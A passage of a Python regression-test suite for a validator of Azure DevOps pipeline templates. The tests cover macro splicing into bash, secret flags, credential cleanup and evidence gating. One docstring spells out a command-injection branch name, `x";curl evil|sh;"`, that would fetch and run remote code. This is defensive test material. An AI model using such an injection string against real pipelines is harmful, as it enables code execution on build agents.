"""
Regression tests for the Azure DevOps template validator (scripts/ado_templates.py).

Every test builds a throwaway template tree in a temp directory, so nothing here
depends on the state of the real working tree. A checker must be provable
independently of whether today's templates happen to be clean.

The suite is written against the failure modes the validator exists to catch —
each was reachable on the v1.7.2 baseline or is one edit away:

  * `--npm-feed-url "$(NPM_FEED_URL)"`: an ADO macro spliced into a bash body.
    ADO expands macros *before* the shell parses the line, so the quotes around
    it are decoration — a value containing `"` ends the string early. This
    shipped in both precommit templates.
  * a template that writes a credential into `~/.git-credentials` and never
    removes it. This shipped in both starter templates back when they wrote a
    GitHub PAT (the shared ones cleaned up; the starters did not). No shipped
    template writes one today; the fixtures below still do, so the rule stays
    proven.
  * a reference to `run-archive` / `commit-archive`, surfaces ADR-005 removed.
  * a `--token`/`--webhook`/`--api-key` flag given a literal instead of
    `env:NAME`, i.e. a secret on a command line.
  * a template that no longer parses, which ADO only reports at queue time in
    the consumer's repository, after they copied the file.
  * a commit template that passes neither `--dockerfile` nor `--platform`, so a
    composite parameter that exists and is honoured is unreachable from the
    pipeline: the consumer can build `./Dockerfile` for linux/amd64 and nothing
    else. This shipped in both commit templates, and it is the
    quiet direction of the same failure — the module signature reads complete
    and the template runs green, so neither end shows the gap.

It also pins the negative direction — a clean fixture must pass, trusted ADO
system macros must NOT be flagged, and the live tree must pass the real CLI —
because a checker that always fails defends nothing either.
"""
from __future__ import annotations

import json
import pathlib
import re
import subprocess
import sys
import tempfile
import textwrap
import unittest

SCRIPTS = pathlib.Path(__file__).resolve().parent.parent
REPO_ROOT = SCRIPTS.parent
sys.path.insert(0, str(SCRIPTS))

from ado_templates import (  # noqa: E402
    ADO_TEMPLATE_DIR,
    ADVISORY_ALLOWED,
    CHECKS,
    TemplateError,
    YamlSubsetError,
    check_all,
    check_container_shape_flags,
    check_dagger_invocations,
    check_evidence_verdict,
    check_merge_lanes_gate,
    check_removed_surfaces,
    check_run_collapsing,
    check_secret_flags,
    check_secret_handling,
    check_shell_quoting,
    check_step_shape,
    check_templates_declared,
    check_templates_parse,
    check_value_interpolation,
    load_templates,
    parse_ado_yaml,
    scan_shell,
)

PIN = "v9.9.9"

# The verdict read. The composites exit 0 on a tripped gate, so without this a
# template is fail-open; the clean fixtures carry it because the clean shape is
# the one that gates. Kept separate so a fixture can drop it precisely.
def gate_step(directory: str) -> str:
    return GATE_STEP.replace("./audit-evidence/", f"./{directory}/")


GATE_STEP = """\
  - bash: |
      evidence=./audit-evidence/combined-evidence.json
      if [ ! -s "$evidence" ] || ! jq . "$evidence" >/dev/null 2>&1; then
        echo "##vso[task.logissue type=error]No readable verdict at $evidence"
        exit 1
      fi
      passed="$(jq -r '.passed' "$evidence")"
      [ "$passed" = "true" ] || exit 1
    displayName: Gate on the evidence verdict
"""

# Kept separate so the "written but never cleared" and "cleared without
# condition: always()" fixtures can remove or edit it exactly.
CLEANUP_STEP = """\
  - bash: |
      rm -f ~/.git-credentials
      git config --global --unset credential.helper || true
    displayName: Clear git credentials
    condition: always()
"""

# A template that satisfies every check. Fixtures below are this shape with one
# thing broken, so a failure is attributable to that one edit.
_COMMIT_WITHOUT_CLEANUP = f"""\
# Starter template: commit pipeline
pool:
  vmImage: ubuntu-latest

variables:
  DAGGER_VERSION: "0.20.8"
  ARTIFACT: "container"
  BUILD_CMD: ""
  DOCKERFILE: ""
  PLATFORM: ""

steps:
  - checkout: self
    fetchDepth: 0

  - bash: |
      git config --global credential.helper store
      printf 'https://oauth2:%s@github.com\\n' "$CICD_GH_TOKEN" > ~/.git-credentials
      chmod 600 ~/.git-credentials
    displayName: Configure git auth for Dagger
    env:
      CICD_GH_TOKEN: $(CICD_GH_TOKEN)

  - bash: |
      # Shape-dependent flags.
      extra=()
      if [ "${{ARTIFACT:-container}}" = "container" ]; then
        extra+=(--dockerfile "$DOCKERFILE" --platform "$PLATFORM")
      fi
      if [ "${{ARTIFACT:-container}}" = "archive" ]; then
        extra+=(--build-cmd "$BUILD_CMD")
      fi
      dagger -m github.com/context-and-oss/cicd/src/composites/commit@{PIN} call run \\
        --src . \\
        --artifact "${{ARTIFACT:-container}}" \\
        --fail-on HIGH \\
        --commit-sha "$(Build.SourceVersion)" \\
        --branch "$BUILD_SOURCEBRANCHNAME" \\
        --repo-url "$(Build.Repository.Uri)" \\
        --teams-webhook env:TEAMS_WEBHOOK \\
        "${{extra[@]}}" \\
        export --path ./audit-evidence
    displayName: Run commit composite
    env:
      ARTIFACT: $(ARTIFACT)
      BUILD_CMD: $(BUILD_CMD)
      DOCKERFILE: $(DOCKERFILE)
      PLATFORM: $(PLATFORM)
      TEAMS_WEBHOOK: $(TEAMS_WEBHOOK)

  - publish: ./audit-evidence
    artifact: commit-evidence-$(Build.SourceVersion)
    displayName: Upload evidence
    condition: always()

"""

CLEAN_COMMIT = _COMMIT_WITHOUT_CLEANUP + GATE_STEP + CLEANUP_STEP

CLEAN_PRECOMMIT = f"""\
pool:
  vmImage: ubuntu-latest

variables:
  DAGGER_VERSION: "0.20.8"

steps:
  - checkout: self

  - bash: |
      dagger -m github.com/context-and-oss/cicd/src/composites/precommit@{PIN} call run \\
        --src . \\
        --fail-on HIGH \\
        --commit-sha "$(Build.SourceVersion)" \\
        --branch "$BUILD_SOURCEBRANCHNAME" \\
        --repo-url "$(Build.Repository.Uri)" \\
        export --path ./audit-evidence
    displayName: Run precommit composite
""" + GATE_STEP

# The third kind. Two things are deliberately unlike the commit fixture and
# both are the point of the kind existing: there is no --src on the invocation
# at all — this is the `url` arm, which has no source tree — and --app is
# assembled into the argument array rather than written on the call line,
# because its partner flag differs per shape.
CLEAN_DAST = f"""\
# Starter template: running-app DAST
pool:
  vmImage: ubuntu-latest

variables:
  DAGGER_VERSION: "0.20.8"
  APP: "url"
  MODE: "baseline"
  TARGET: ""
  DOCKERFILE: ""
  PLATFORM: ""

steps:
  - checkout: self

  - bash: |
      git config --global credential.helper store
      printf 'https://oauth2:%s@github.com\\n' "$CICD_GH_TOKEN" > ~/.git-credentials
      chmod 600 ~/.git-credentials
    displayName: Configure git auth for Dagger
    env:
      CICD_GH_TOKEN: $(CICD_GH_TOKEN)

  - bash: |
      # Shape-dependent flags.
      extra=()
      case "$APP" in
        url)       extra+=(--app url --target "$TARGET") ;;
        service)   extra+=(--app service) ;;
        container) extra+=(--app container --src .)
                   extra+=(--dockerfile "$DOCKERFILE" --platform "$PLATFORM") ;;
      esac
      dagger -m github.com/context-and-oss/cicd/src/composites/dast@{PIN} call scan \\
        --mode "$MODE" \\
        --fail-on HIGH \\
        --commit-sha "$(Build.SourceVersion)" \\
        --branch "$BUILD_SOURCEBRANCHNAME" \\
        --repo-url "$(Build.Repository.Uri)" \\
        "${{extra[@]}}" \\
        export --path ./dast-scan.json
      dagger -m github.com/context-and-oss/cicd/src/composites/dast@{PIN} call package \\
        --evidence ./dast-scan.json \\
        --commit-sha "$(Build.SourceVersion)" \\
        --branch "$BUILD_SOURCEBRANCHNAME" \\
        --repo-url "$(Build.Repository.Uri)" \\
        --teams-webhook env:TEAMS_WEBHOOK \\
        export --path ./dast-evidence
    displayName: Run DAST composite
    env:
      APP: $(APP)
      MODE: $(MODE)
      TARGET: $(TARGET)
      DOCKERFILE: $(DOCKERFILE)
      PLATFORM: $(PLATFORM)
      TEAMS_WEBHOOK: $(TEAMS_WEBHOOK)

""" + gate_step("dast-evidence") + CLEANUP_STEP


class FixtureGatePathTests(unittest.TestCase):
    """A clean fixture's gate reads the directory its producer exports.

    The gate fails closed on a missing file, so a mismatched clean fixture is
    a pipeline that could never pass, not a realistic positive case.
    """

    def test_each_clean_fixture_gates_on_its_exported_evidence(self):
        for name, fixture in (("commit", CLEAN_COMMIT), ("precommit", CLEAN_PRECOMMIT), ("dast", CLEAN_DAST)):
            with self.subTest(fixture=name):
                read = re.search(r"evidence=\./([\w-]+)/combined-evidence\.json", fixture)
                self.assertIsNotNone(read)
                exported = re.findall(r"export --path \./([\w.-]+)\s*$", fixture, re.M)
                self.assertIn(read[1], exported)


class FixtureTestCase(unittest.TestCase):
    """Builds a temp tree containing an inventory and ADO templates."""

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.root = pathlib.Path(self._tmp.name)
        self.templates: dict[str, str] = {}

    def write(self, name: str, source: str) -> None:
        """Add a template under templates/azure-devops/."""
        self.templates[name] = source

    def build(self, *, declared: list[str] | None = None) -> object:
        base = self.root / ADO_TEMPLATE_DIR
        for name, source in self.templates.items():
            path = base / name
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(source)

        rels = declared if declared is not None else [
            f"{ADO_TEMPLATE_DIR}/{name}" for name in self.templates
        ]
        inventory = self.root / "inventory.json"
        inventory.write_text(json.dumps({"active_surfaces": {"templates": rels}}))
        return load_templates(self.root, inventory)

    def standard(self) -> object:
        """A tree with one clean commit template and one clean precommit template."""
        self.write("commit.yml", CLEAN_COMMIT)
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        return self.build()

    def assertClean(self, ts) -> None:
        failed = {name: problems for name, problems in check_all(ts) if problems}
        self.assertEqual(failed, {}, f"expected a clean fixture, got {failed}")

    def assertFails(self, problems: list[str], needle: str) -> None:
        self.assertTrue(problems, f"expected a problem mentioning {needle!r}, got none")
        joined = "\n".join(problems)
        self.assertIn(needle, joined)


# ─────────────────────────────────────────────────────────────────────────────
# the checker must accept a correct template
# ─────────────────────────────────────────────────────────────────────────────


class BaselineFixtureTests(FixtureTestCase):
    def test_clean_templates_pass_every_check(self) -> None:
        self.assertClean(self.standard())

    def test_trusted_system_macros_are_not_flagged(self) -> None:
        """Build.*/System.*/Agent.* values come from ADO, not from a consumer."""
        ts = self.standard()
        self.assertEqual(check_value_interpolation(ts), [])

    def test_branch_name_macros_are_not_trusted(self) -> None:
        """A branch name is pusher-chosen text: git refs may carry `$(`, `;` and `|`.

        ADO expands $(Build.SourceBranchName) before bash parses the line, so a
        branch named `x";curl evil|sh;"` runs as code. The macro is refused, and
        the message names the variable ADO already exports to the environment.
        """
        for macro, safe in (
            ("Build.SourceBranchName", "$BUILD_SOURCEBRANCHNAME"),
            ("Build.SourceBranch", "$BUILD_SOURCEBRANCH"),
            ("System.PullRequest.SourceBranch", "$SYSTEM_PULLREQUEST_SOURCEBRANCH"),
            ("System.PullRequest.TargetBranch", "$SYSTEM_PULLREQUEST_TARGETBRANCH"),
            ("Build.BuildNumber", "$BUILD_BUILDNUMBER"),
        ):
            with self.subTest(macro=macro):
                self.setUp()
                self.write("commit.yml", CLEAN_COMMIT.replace(
                    '"$BUILD_SOURCEBRANCHNAME"', f'"$({macro})"', 1
                ))
                self.write("precommit.yml", CLEAN_PRECOMMIT)
                problems = check_value_interpolation(self.build())
                self.assertFails(problems, f"splices $({macro})")
                self.assertFails(problems, f'"{safe}"')

    def test_template_owned_dagger_version_is_allowed_inline(self) -> None:
        self.write(
            "commit.yml",
            CLEAN_COMMIT.replace(
                "      extra=()",
                '      curl -fsSL https://dl.dagger.io/x | DAGGER_VERSION=$(DAGGER_VERSION) sh\n      extra=()',
            ),
        )
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        self.assertEqual(check_value_interpolation(self.build()), [])

    def test_every_declared_check_runs(self) -> None:
        """check_all must not silently drop a check."""
        ts = self.standard()
        self.assertEqual(len(check_all(ts)), len(CHECKS))
        self.assertEqual(len(CHECKS), 13)


# ─────────────────────────────────────────────────────────────────────────────
# the evidence verdict (CAPS-042)
# ─────────────────────────────────────────────────────────────────────────────


class EvidenceVerdictTests(FixtureTestCase):
    """A template must gate on `passed`, or say in the file that it does not.

    All four shipped templates were fail-open from v1.16.1, when the composites
    stopped signalling a gate trip through their exit status. Nothing caught it
    because nothing looked: a fail-open template is green, parses, pins
    correctly and passes every other check in this file. The only observable
    difference is a build that says success over findings it collected itself.
    """

    BANNER = "# ─── !! THIS PIPELINE DOES NOT GATE !! ───\n"

    def test_no_gate_and_no_banner_fails(self) -> None:
        self.write("precommit.yml", CLEAN_PRECOMMIT.replace(GATE_STEP, ""))
        self.assertFails(
            check_evidence_verdict(self.build()),
            "never reads `passed`",
        )

    def test_declared_advisory_passes(self) -> None:
        """Advisory is allowed. Silent is not — the difference is the banner."""
        source = self.BANNER + CLEAN_PRECOMMIT.replace(GATE_STEP, "")
        self.write("precommit.yml", source)
        self.assertEqual(check_evidence_verdict(self.build()), [])

    def test_gate_plus_stale_banner_fails(self) -> None:
        """The banner must not outlive the gap. Otherwise the file lies the other way."""
        self.write("precommit.yml", self.BANNER + CLEAN_PRECOMMIT)
        self.assertFails(
            check_evidence_verdict(self.build()),
            "still carries the",
        )

    def test_commented_out_gate_is_not_a_gate(self) -> None:
        """The shape the real templates ship: a paste-ready gate, commented out.

        It has to NOT count. A commented gate is documentation, and if it
        satisfied the check then adding the snippet would silence the warning
        without changing what the pipeline does — which is the precise failure
        mode this check exists to make impossible.
        """
        commented = "\n".join(
            "  # " + line for line in GATE_STEP.splitlines()
        )
        source = CLEAN_PRECOMMIT.replace(GATE_STEP, commented + "\n")
        self.write("precommit.yml", source)
        self.assertFails(
            check_evidence_verdict(self.build()),
            "never reads `passed`",
        )

    def test_passed_named_only_in_a_live_comment_is_not_a_gate(self) -> None:
        """A mention inside a running bash body is still just prose."""
        source = CLEAN_PRECOMMIT.replace(
            GATE_STEP,
            "  - bash: |\n"
            "      # TODO: read .passed from combined-evidence.json and exit 1\n"
            "      echo skipped\n"
            "    displayName: Not a gate\n",
        )
        self.write("precommit.yml", source)
        self.assertFails(
            check_evidence_verdict(self.build()),
            "never reads `passed`",
        )

    def test_commit_templates_are_held_to_it_too(self) -> None:
        """The commit lane produces the evidence a release record is built from."""
        self.write("commit.yml", CLEAN_COMMIT.replace(GATE_STEP, ""))
        self.assertFails(
            check_evidence_verdict(self.build()),
            "commit.yml",
        )

    def test_shipped_templates_declare_their_stance(self) -> None:
        """The live tree, not a fixture: every real template gates or admits it does not."""
        ts = load_templates(REPO_ROOT, REPO_ROOT / "scripts" / "repo-inventory.json")
        self.assertEqual(check_evidence_verdict(ts), [])


class MergeLaneGateTests(FixtureTestCase):
    """A merge-lane starter gates; a banner is not enough for it.

    Both precommit templates shipped from CAPS-042 to the open-source prep with
    the gate step present, correct and commented out, which check_evidence_verdict
    accepted because the banner declared it. The declaration was honest and the
    starter was still a pipeline that goes green over its own findings.
    """

    BANNER = EvidenceVerdictTests.BANNER

    def test_a_declared_advisory_precommit_is_refused(self) -> None:
        """Exactly the shape that shipped: banner present, gate commented out."""
        commented = "\n".join("  # " + line for line in GATE_STEP.splitlines())
        source = self.BANNER + CLEAN_PRECOMMIT.replace(GATE_STEP, commented + "\n")
        self.write("precommit.yml", source)
        ts = self.build()
        self.assertEqual(check_evidence_verdict(ts), [], "the banner satisfies the verdict check")
        self.assertFails(check_merge_lanes_gate(ts), "precommit.yml")
        self.assertFails(check_merge_lanes_gate(ts), "commented-out gate")

    def test_a_declared_advisory_commit_is_refused(self) -> None:
        self.write("commit.yml", self.BANNER + CLEAN_COMMIT.replace(GATE_STEP, ""))
        self.assertFails(check_merge_lanes_gate(self.build()), "commit.yml")

    def test_dast_may_stay_advisory_with_its_reason(self) -> None:
        self.write("dast.yml", self.BANNER + CLEAN_PRECOMMIT.replace(GATE_STEP, ""))
        self.assertEqual(check_merge_lanes_gate(self.build()), [])

    def test_the_allowance_carries_a_reason(self) -> None:
        for rel, reason in ADVISORY_ALLOWED.items():
            self.assertTrue(reason.strip(), f"{rel} is allowed advisory with no reason")

    def test_shipped_merge_lane_templates_gate(self) -> None:
        """The live tree: both precommit templates and both commit templates
        carry a live verdict read, and no banner."""
        ts = load_templates(REPO_ROOT, REPO_ROOT / "scripts" / "repo-inventory.json")
        self.assertEqual(check_merge_lanes_gate(ts), [])
        gating = sorted(t.rel for t in ts.templates if t.rel not in ADVISORY_ALLOWED)
        self.assertEqual(
            gating,
            [
                "templates/azure-devops/commit.yml",
                "templates/azure-devops/precommit.yml",
                "templates/azure-devops/shared/commit.yml",
                "templates/azure-devops/shared/precommit.yml",
            ],
        )


# ─────────────────────────────────────────────────────────────────────────────
# superseded runs: PR builds cancel, commit builds never batch
# ─────────────────────────────────────────────────────────────────────────────


class RunCollapsingTests(FixtureTestCase):
    PR_CANCEL = "pr:\n  autoCancel: true\n  branches:\n    include:\n      - '*'\n\n"
    PR_SILENT = "pr:\n  branches:\n    include:\n      - '*'\n\n"
    PR_KEEP = "pr:\n  autoCancel: false\n  branches:\n    include:\n      - '*'\n\n"
    UNBATCHED = "trigger:\n  batch: false\n  branches:\n    include:\n      - main\n\n"
    SILENT = "trigger:\n  branches:\n    include:\n      - main\n\n"
    BATCHED = "trigger:\n  batch: true\n  branches:\n    include:\n      - main\n\n"

    def test_stated_settings_pass_every_check(self) -> None:
        self.write("commit.yml", self.UNBATCHED + CLEAN_COMMIT)
        self.write("precommit.yml", self.PR_CANCEL + CLEAN_PRECOMMIT)
        ts = self.build()
        self.assertClean(ts)

    def test_a_precommit_pr_trigger_must_state_auto_cancel(self) -> None:
        for prefix in (self.PR_SILENT, self.PR_KEEP):
            with self.subTest(prefix=prefix):
                self.write("precommit.yml", prefix + CLEAN_PRECOMMIT)
                self.assertFails(check_run_collapsing(self.build()), "autoCancel: true")

    def test_a_commit_trigger_must_state_batch_false(self) -> None:
        for prefix in (self.SILENT, self.BATCHED):
            with self.subTest(prefix=prefix):
                self.write("commit.yml", prefix + CLEAN_COMMIT)
                self.assertFails(check_run_collapsing(self.build()), "batch: false")

    def test_a_template_with_no_trigger_is_left_to_its_repository(self) -> None:
        self.assertEqual(check_run_collapsing(self.standard()), [])

    def test_shipped_starters_state_both_settings(self) -> None:
        """Not vacuous on the live tree: both top-level starters declare the
        trigger the check grades, and both pass."""
        ts = load_templates(REPO_ROOT, REPO_ROOT / "scripts" / "repo-inventory.json")
        self.assertEqual(check_run_collapsing(ts), [])
        by_rel = {t.rel: t.document for t in ts.templates}
        self.assertIs(by_rel["templates/azure-devops/precommit.yml"]["pr"]["autoCancel"], True)
        self.assertIs(by_rel["templates/azure-devops/commit.yml"]["trigger"]["batch"], False)


# ─────────────────────────────────────────────────────────────────────────────
# container-shape overrides
# ─────────────────────────────────────────────────────────────────────────────


class ContainerShapeFlagTests(FixtureTestCase):
    """`commit.Run` honours --dockerfile/--platform; the template must reach them."""

    def commit_with(self, replacement: tuple[str, str]) -> object:
        old, new = replacement
        self.assertIn(old, CLEAN_COMMIT)
        self.write("commit.yml", CLEAN_COMMIT.replace(old, new))
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        return self.build()

    def test_missing_container_flags_fail(self) -> None:
        """The shipped-before state: both flags absent, everything else clean."""
        ts = self.commit_with(
            (
                '''      if [ "${ARTIFACT:-container}" = "container" ]; then
        extra+=(--dockerfile "$DOCKERFILE" --platform "$PLATFORM")
      fi
''',
                "",
            )
        )
        problems = check_container_shape_flags(ts)
        self.assertFails(problems, "never passes --dockerfile")
        self.assertFails(problems, "never passes --platform")
        self.assertEqual(len(problems), 2, problems)

    def test_flag_named_only_in_a_comment_fails(self) -> None:
        """A comment reaches no dagger call, so it must not satisfy the check."""
        ts = self.commit_with(
            (
                '''        extra+=(--dockerfile "$DOCKERFILE" --platform "$PLATFORM")''',
                '''        # --dockerfile "$DOCKERFILE" --platform "$PLATFORM"
        :''',
            )
        )
        problems = check_container_shape_flags(ts)
        self.assertFails(problems, "never passes --dockerfile")
        self.assertFails(problems, "never passes --platform")

    def test_macro_spliced_dockerfile_fails(self) -> None:
        """ADO expands $(DOCKERFILE) before the shell sees it, so quoting is decoration."""
        ts = self.commit_with(('"$DOCKERFILE"', '"$(DOCKERFILE)"'))
        self.assertFails(check_container_shape_flags(ts), "must arrive from the step's env:")
        # …and the macro-splicing check rejects it independently.
        self.assertFails(check_value_interpolation(ts), "splices $(DOCKERFILE)")

    def test_flag_value_absent_from_the_env_mapping_fails(self) -> None:
        """A flag reading an undeclared variable silently carries an empty value."""
        ts = self.commit_with(("      DOCKERFILE: $(DOCKERFILE)\n", ""))
        self.assertFails(
            check_container_shape_flags(ts),
            "env: mapping does not declare DOCKERFILE",
        )

    def test_precommit_is_not_asked_for_container_flags(self) -> None:
        """The precommit composite builds no image, so the flags do not apply to it."""
        ts = self.standard()
        self.assertEqual(check_container_shape_flags(ts), [])

    def test_shipped_commit_templates_pass_both_flags(self) -> None:
        """The live tree, not a fixture: the real templates must reach both overrides."""
        ts = load_templates(REPO_ROOT, SCRIPTS / "repo-inventory.json")
        commits = [t for t in ts.templates if t.is_commit]
        self.assertEqual(len(commits), 2, [t.rel for t in commits])
        self.assertEqual(check_container_shape_flags(ts), [])


# ─────────────────────────────────────────────────────────────────────────────
# removed surfaces (ADR-005)
# ─────────────────────────────────────────────────────────────────────────────


class RemovedSurfaceTests(FixtureTestCase):
    def test_run_archive_command_fails(self) -> None:
        self.write("commit.yml", CLEAN_COMMIT.replace("call run \\", "call run-archive \\"))
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        ts = self.build()
        self.assertFails(check_removed_surfaces(ts), "run-archive")
        # …and the invocation check independently rejects the non-`run` command.
        self.assertFails(check_dagger_invocations(ts), "supported entry points for this template are run")

    def test_commit_archive_reference_in_prose_fails(self) -> None:
        self.write(
            "commit.yml",
            CLEAN_COMMIT.replace(
                "# Starter template: commit pipeline",
                "# Starter template: commit pipeline\n# For archives, use commit-archive.yml instead.",
            ),
        )
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        self.assertFails(check_removed_surfaces(self.build()), "commit-archive")

    def test_removed_surface_inside_a_bash_comment_is_found(self) -> None:
        """Bash comments are content: the tokeniser must not drop them."""
        self.write(
            "commit.yml",
            CLEAN_COMMIT.replace(
                "      # Shape-dependent flags.",
                "      # Shape-dependent flags. For archives call run-archive instead.",
            ),
        )
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        self.assertFails(check_removed_surfaces(self.build()), "run-archive")


# ─────────────────────────────────────────────────────────────────────────────
# the unified invocation
# ─────────────────────────────────────────────────────────────────────────────


class InvocationTests(FixtureTestCase):
    def test_commit_template_without_artifact_flag_fails(self) -> None:
        self.write("commit.yml", CLEAN_COMMIT.replace(
            '        --artifact "${ARTIFACT:-container}" \\\n', ""
        ))
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        self.assertFails(check_dagger_invocations(self.build()), "--artifact")

    def test_missing_fail_on_flag_fails(self) -> None:
        self.write("commit.yml", CLEAN_COMMIT.replace("        --fail-on HIGH \\\n", ""))
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        self.assertFails(check_dagger_invocations(self.build()), "--fail-on")

    def test_missing_repo_provenance_flags_fail(self) -> None:
        self.write("precommit.yml", CLEAN_PRECOMMIT.replace(
            '        --commit-sha "$(Build.SourceVersion)" \\\n', ""
        ))
        self.write("commit.yml", CLEAN_COMMIT)
        self.assertFails(check_dagger_invocations(self.build()), "--commit-sha")

    def test_template_calling_the_wrong_composite_fails(self) -> None:
        self.write("commit.yml", CLEAN_COMMIT.replace(
            "src/composites/commit@", "src/composites/precommit@"
        ))
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        self.assertFails(check_dagger_invocations(self.build()), "expected 'src/composites/commit'")

    def test_template_with_no_composite_call_fails(self) -> None:
        self.write("precommit.yml", textwrap.dedent("""\
            pool:
              vmImage: ubuntu-latest
            variables:
              DAGGER_VERSION: "0.20.8"
            steps:
              - bash: |
                  echo "nothing to see here"
                displayName: Do nothing
            """))
        self.assertFails(check_dagger_invocations(self.build()), "contains no pinned")


# ─────────────────────────────────────────────────────────────────────────────
# unsafe value interpolation — the shipped defect
# ─────────────────────────────────────────────────────────────────────────────


class InterpolationTests(FixtureTestCase):
    def test_consumer_macro_spliced_into_bash_fails(self) -> None:
        """The exact shape both precommit templates shipped."""
        self.write("precommit.yml", CLEAN_PRECOMMIT.replace(
            "        --src . \\",
            '        --src . \\\n        --npm-feed-url "$(NPM_FEED_URL)" \\',
        ))
        self.write("commit.yml", CLEAN_COMMIT)
        self.assertFails(check_value_interpolation(self.build()), "$(NPM_FEED_URL)")

    def test_quoting_a_macro_does_not_make_it_safe(self) -> None:
        """Quotes cannot contain a value ADO splices in before bash parses."""
        unquoted = CLEAN_PRECOMMIT.replace(
            "        --src . \\", "        --src . \\\n        --org $(ADO_ORG) \\"
        )
        quoted = CLEAN_PRECOMMIT.replace(
            "        --src . \\", '        --src . \\\n        --org "$(ADO_ORG)" \\'
        )
        for source in (unquoted, quoted):
            with self.subTest(source=source[:0] or "variant"):
                self.setUp()
                self.write("precommit.yml", source)
                self.write("commit.yml", CLEAN_COMMIT)
                self.assertFails(check_value_interpolation(self.build()), "$(ADO_ORG)")

    def test_macro_in_a_bash_comment_still_fails(self) -> None:
        """ADO expands macros inside shell comments too."""
        self.write("precommit.yml", CLEAN_PRECOMMIT.replace(
            "  - bash: |\n", "  - bash: |\n      # uses $(MY_ORG) below\n", 1
        ))
        self.write("commit.yml", CLEAN_COMMIT)
        self.assertFails(check_value_interpolation(self.build()), "$(MY_ORG)")


class QuotingTests(FixtureTestCase):
    def test_unquoted_env_expansion_fails(self) -> None:
        self.write("commit.yml", CLEAN_COMMIT.replace(
            'extra+=(--build-cmd "$BUILD_CMD")', "extra+=(--build-cmd $BUILD_CMD)"
        ))
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        self.assertFails(check_shell_quoting(self.build()), "expands $BUILD_CMD unquoted")

    def test_expansion_inside_a_double_quoted_string_is_accepted(self) -> None:
        self.write("commit.yml", CLEAN_COMMIT.replace(
            'extra+=(--build-cmd "$BUILD_CMD")', 'extra+=(--build-cmd "prefix $BUILD_CMD")'
        ))
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        self.assertEqual(check_shell_quoting(self.build()), [])

    def test_local_shell_variables_are_not_policed(self) -> None:
        """Only consumer-supplied env: values are in scope."""
        self.write("commit.yml", CLEAN_COMMIT.replace(
            "      extra=()", "      local_thing=x\n      echo $local_thing\n      extra=()"
        ))
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        self.assertEqual(check_shell_quoting(self.build()), [])


# ─────────────────────────────────────────────────────────────────────────────
# secret handling
# ─────────────────────────────────────────────────────────────────────────────


class SecretFlagTests(FixtureTestCase):
    def test_literal_secret_on_the_command_line_fails(self) -> None:
        self.write("commit.yml", CLEAN_COMMIT.replace(
            "--teams-webhook env:TEAMS_WEBHOOK",
            "--teams-webhook https://outlook.office.com/webhook/abc123",
        ))
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        self.assertFails(check_secret_flags(self.build()), "must be handed to Dagger as `env:NAME`")

    def test_secret_passed_as_a_macro_fails(self) -> None:
        self.write("commit.yml", CLEAN_COMMIT.replace(
            "--teams-webhook env:TEAMS_WEBHOOK", '--teams-webhook "$(TEAMS_WEBHOOK)"'
        ))
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        ts = self.build()
        self.assertFails(check_secret_flags(ts), "env:NAME")
        self.assertFails(check_value_interpolation(ts), "$(TEAMS_WEBHOOK)")

    def test_env_reference_without_a_declaration_fails(self) -> None:
        """`env:NAME` with no env: entry silently hands Dagger an empty secret."""
        self.write("commit.yml", CLEAN_COMMIT.replace(
            "      TEAMS_WEBHOOK: $(TEAMS_WEBHOOK)\n", ""
        ))
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        self.assertFails(check_secret_flags(self.build()), "does not declare TEAMS_WEBHOOK")

    def test_env_reference_inside_a_bash_array_is_accepted(self) -> None:
        """`extra+=(--npm-token env:NPM_FEED_TOKEN)` must not trip on the paren."""
        self.write("commit.yml", CLEAN_COMMIT.replace(
            'extra+=(--build-cmd "$BUILD_CMD")',
            'extra+=(--build-cmd "$BUILD_CMD" --npm-token env:NPM_FEED_TOKEN)',
        ).replace(
            "      TEAMS_WEBHOOK: $(TEAMS_WEBHOOK)",
            "      TEAMS_WEBHOOK: $(TEAMS_WEBHOOK)\n      NPM_FEED_TOKEN: $(NPM_FEED_TOKEN)",
        ))
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        self.assertEqual(check_secret_flags(self.build()), [])


class SecretHandlingTests(FixtureTestCase):
    def test_credentials_written_but_never_cleared_fails(self) -> None:
        """The exact shape both starter templates shipped."""
        self.write("commit.yml", _COMMIT_WITHOUT_CLEANUP)
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        self.assertFails(check_secret_handling(self.build()), "never removes it")

    def test_cleanup_without_always_condition_fails(self) -> None:
        self.write("commit.yml", _COMMIT_WITHOUT_CLEANUP + CLEANUP_STEP.replace(
            "    condition: always()\n", ""
        ))
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        self.assertFails(check_secret_handling(self.build()), "condition: always()")

    def test_echoing_a_secret_fails(self) -> None:
        self.write("commit.yml", CLEAN_COMMIT.replace(
            "      extra=()", '      echo "webhook is $TEAMS_WEBHOOK"\n      extra=()'
        ))
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        self.assertFails(check_secret_handling(self.build()), "echoes $TEAMS_WEBHOOK")

    def test_writing_a_secret_to_a_file_is_not_an_echo(self) -> None:
        """A credential written to a file is legitimate; only stdout is a leak."""
        self.assertEqual(check_secret_handling(self.standard()), [])


# ─────────────────────────────────────────────────────────────────────────────
# structural validity
# ─────────────────────────────────────────────────────────────────────────────


class DeclarationTests(FixtureTestCase):
    def test_declared_template_that_does_not_exist_fails(self) -> None:
        self.write("commit.yml", CLEAN_COMMIT)
        self.write("precommit.yml", CLEAN_PRECOMMIT)
        ts = self.build(declared=[
            f"{ADO_TEMPLATE_DIR}/commit.yml",
            f"{ADO_TEMPLATE_DIR}/precommit.yml",
            f"{ADO_TEMPLATE_DIR}/commit-archive.yml",  # deleted by ADR-005
